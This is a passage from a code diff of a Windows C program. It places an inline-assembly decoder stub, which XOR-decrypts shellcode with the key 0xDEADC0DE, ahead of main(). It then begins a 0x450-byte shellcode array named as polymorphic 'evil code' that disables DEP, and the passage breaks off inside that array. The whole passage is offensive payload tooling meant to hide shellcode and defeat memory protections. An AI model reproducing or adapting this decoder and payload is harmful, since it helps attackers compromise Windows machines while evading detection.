@@ -2,33 +2,37 @@
 #include <windows.h>
 
 
-int main() 
-
-{ 
 // this is decoder stub , which the shellcode  is preceded with , it simply xor's it with 'DEADC0DE' 
-/*
+
+//----------------------------
 __asm 
 	{   
-	 call eip 
+	        call eip 
 eip : 
-	    pop edx  //get EIP 
-        add edx , 0x26  //  (decoder)EIP + addr of shellcode  
+	        pop edx  //get EIP 
+                add edx , 0x26  //  (decoder)EIP + addr of shellcode  
 		xor eax , eax 
 		xor ecx , ecx 
 		
 decoder:	
-	    mov eax , dword ptr [shellcode + ecx]	 
-        xor eax , 0xDEADC0DE  //decrypt 
-        mov ebx ,  edx
+	        mov eax , dword ptr [shellcode + ecx]	 
+                xor eax , 0xDEADC0DE  //decrypt 
+                mov ebx ,  edx
 		add ebx , ecx 
 		mov dword ptr [ebx] , eax 
-        add ecx , 4
+                add ecx , 4
 		cmp ecx , 0x450 
 		jz done  
 		jmp decoder
 done :     
 	}
-*/
+//----------------------------------	
+
+int main() 
+
+{ 
+
+
  //0x450 bytes !
  char DisableDEPPolymorphic3vilC0de[] = 
    "\xE8 \x00\x00\x00\x00\x5A\x83\xC2\x26\x33\xC0\x33\xC9\x8B\x81\x00\x50\x34\x01"
